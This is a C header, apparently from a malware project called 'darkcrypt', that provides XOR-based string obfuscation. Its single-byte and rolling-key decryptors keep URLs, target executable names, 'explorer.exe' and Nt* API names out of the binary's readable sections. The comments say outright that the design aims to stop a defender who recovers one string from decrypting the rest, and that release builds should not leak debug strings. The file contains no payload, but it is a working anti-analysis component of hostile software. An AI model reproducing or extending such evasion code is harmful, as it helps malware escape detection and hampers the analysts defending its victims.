/*
 * obfuscation.h — Compile-time string obfuscation for darkcrypt
 *
 * Provides XOR-based string encryption that prevents plaintext strings
 * from appearing in the compiled binary's .rdata section.
 *
 * Strings are stored as XOR'd byte arrays (generated by tools/xor_encode.py)
 * and decrypted into stack buffers at runtime via xor_dec().
 *
 * Usage:
 *   static const uint8_t _enc_foo[] = { 0x27, 0x3a, ... };  // "explorer.exe" ^ 0x42
 *   char _buf_foo[13];
 *   char *foo = xor_dec(_buf_foo, _enc_foo, 12, 0x42);
 *
 * For wide strings (wchar_t*):
 *   static const uint8_t _enc_w[] = { ... };
 *   wchar_t _buf_w[...];
 *   wchar_t *w = xor_dec_w(_buf_w, _enc_w, len, key);
 */

#ifndef OBFUSCATION_H
#define OBFUSCATION_H

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

/* ---- ANSI string decrypt (SINGLE-BYTE) ----
 * NOTE: single-byte XOR is vulnerable to known-plaintext recovery
 * (URLs start with "http://", targets end in ".exe"). Recovering ONE
 * string yields the key and decrypts ALL others. New strings should
 * prefer the multi-byte rolling-key variants xor_dec_mb() / xor_dec_w_mb()
 * below, which give each string its own key of N bytes. These single-byte
 * helpers are kept for backward compatibility with existing call sites. */
static __attribute__((always_inline)) inline
char *xor_dec(char *buf, const uint8_t *enc, int len, uint8_t key)
{
    for (int i = 0; i < len; i++)
        buf[i] = (char)(enc[i] ^ key);
    buf[len] = '\0';
    return buf;
}

/* ---- Wide string decrypt (SINGLE-BYTE, for WinHTTP, CreateProcessW, etc.) ----
 * Same known-plaintext caveat as xor_dec(); prefer xor_dec_w_mb(). */
static __attribute__((always_inline)) inline
wchar_t *xor_dec_w(wchar_t *buf, const uint8_t *enc, int nchars, uint8_t key)
{
    for (int i = 0; i < nchars; i++) {
        uint8_t lo = enc[i * 2]     ^ key;
        uint8_t hi = enc[i * 2 + 1] ^ key;
        buf[i] = (wchar_t)(lo | ((wchar_t)hi << 8));
    }
    buf[nchars] = L'\0';
    return buf;
}

/* ---- Multi-byte rolling-key ANSI string decrypt ----
 * Each string carries its own N-byte key (key_len); the key cycles across
 * the ciphertext so enc[i] = data[i] ^ key[i % key_len]. A defender who
 * recovers one string learns only that string's key, not a global one. */
static __attribute__((always_inline)) inline
char *xor_dec_mb(char *buf, const uint8_t *enc, int len,
                 const uint8_t *key, int key_len)
{
    for (int i = 0; i < len; i++)
        buf[i] = (char)(enc[i] ^ key[i % key_len]);
    buf[len] = '\0';
    return buf;
}

/* ---- Multi-byte rolling-key wide string decrypt ----
 * UTF-16LE bytes are keyed byte-wise: lo and hi of each wchar_t are XOR'd
 * against key[(i*2) % key_len] and key[(i*2+1) % key_len] respectively. */
static __attribute__((always_inline)) inline
wchar_t *xor_dec_w_mb(wchar_t *buf, const uint8_t *enc, int nchars,
                      const uint8_t *key, int key_len)
{
    for (int i = 0; i < nchars; i++) {
        uint8_t lo = enc[i * 2]     ^ key[(i * 2)     % key_len];
        uint8_t hi = enc[i * 2 + 1] ^ key[(i * 2 + 1) % key_len];
        buf[i] = (wchar_t)(lo | ((wchar_t)hi << 8));
    }
    buf[nchars] = L'\0';
    return buf;
}

/* ---- Debug output guard ----
 * NOTE: use #if DEBUG (value test), not #ifdef DEBUG (definition test).
 * The Makefile passes -DDEBUG=0 for release builds; #ifdef would still be
 * true in that case, leaking debug format strings (which embed Nt* names)
 * into the release binary's .rdata. With #if DEBUG, DEBUG=0 is false. */
#if DEBUG
  #define DBG_PRINTF(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
  #define DBG_PRINTF(fmt, ...) ((void)0)
#endif

/* ---- Secure zero memory (volatile prevents compiler optimization) ---- */
static __attribute__((always_inline)) inline
void secure_zero(void *p, size_t n)
{
    volatile uint8_t *v = (volatile uint8_t *)p;
    while (n--) *v++ = 0;
}

#endif /* OBFUSCATION_H */